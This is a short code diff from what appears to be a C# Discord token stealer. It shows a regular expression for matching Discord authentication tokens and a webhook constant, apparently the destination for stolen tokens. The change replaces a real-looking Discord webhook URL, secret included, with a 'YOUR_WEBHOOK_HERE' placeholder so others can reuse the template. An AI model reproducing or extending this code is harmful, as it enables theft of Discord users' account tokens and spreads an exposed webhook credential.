@@ -10,7 +10,7 @@ using Newtonsoft.Json;
 class Program
 {
    //weebhook here
-    const string WEBHOOK_URL = "https://discord.com/api/webhooks/1392063965357543507/e8Mi38Fm8X_rs31ixZw892uG9N8a0aUxC0beIf-1pfldJpn12T1MnnzEE_zfYYxt1LCI";
+    const string WEBHOOK_URL = "YOUR_WEBHOOK_HERE";
 
     // Discord token regex
     static readonly Regex tokenRegex = new Regex(@"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);
